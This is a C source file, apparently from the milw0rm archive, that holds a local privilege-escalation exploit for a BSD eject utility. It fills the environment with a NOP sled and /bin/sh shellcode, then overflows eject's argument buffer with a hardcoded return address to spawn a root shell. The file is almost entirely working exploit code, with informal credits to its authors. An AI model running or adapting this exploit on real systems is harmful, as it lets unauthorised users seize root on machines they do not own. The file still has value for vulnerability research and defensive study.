// ejecsploit.c - local root exploit for bsd's eject.c
// harry
// vuln found by kokanin (you 31337!!! ;))
// thanks to sacrine and all the other netric guys!!! you rule :)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define LEN 1264
#define NOP 0x90

extern char** environ;

int main(){

  char buf[LEN];
  char* ptr;
  char* arg[4];
  unsigned int ret, i;
  char shellcode[]="\xeb\x17\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"
                   "\x43\x0c\x50\x8d\x53\x08\x52\x53\xb0\x3b\x50\xcd"
                   "\x80\xe8\xe4\xff\xff\xff/bin/sh";
  // hardcoded... too boneidle to fix this
  ret = 0xbfbfee16;
  char envshell[4096];
  ptr = envshell;
  for (i = 0; i < 4096 - strlen(shellcode) - 1; i++) *(ptr++) = NOP;
  for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i];
  *(ptr) = 0x0;
  memcpy (envshell, "BLEH=",5);
  putenv(envshell);

  memset (buf, 0x41, sizeof(buf));
  buf[LEN-5] = (char) ( 0x000000ff & ret);
  buf[LEN-4] = (char) ((0x0000ff00 & ret) >> 8);
  buf[LEN-3] = (char) ((0x00ff0000 & ret) >> 16);
  buf[LEN-2] = (char) ((0xff000000 & ret) >> 24);
  buf[LEN-1] = 0x0;

  arg[0] = "/usr/local/sbin/eject";
  arg[1] = "-t";
  arg[2] = buf;
  arg[3] = NULL;

  execve (arg[0], arg, environ);

  return 0;
}

// milw0rm.com [2007-03-26]
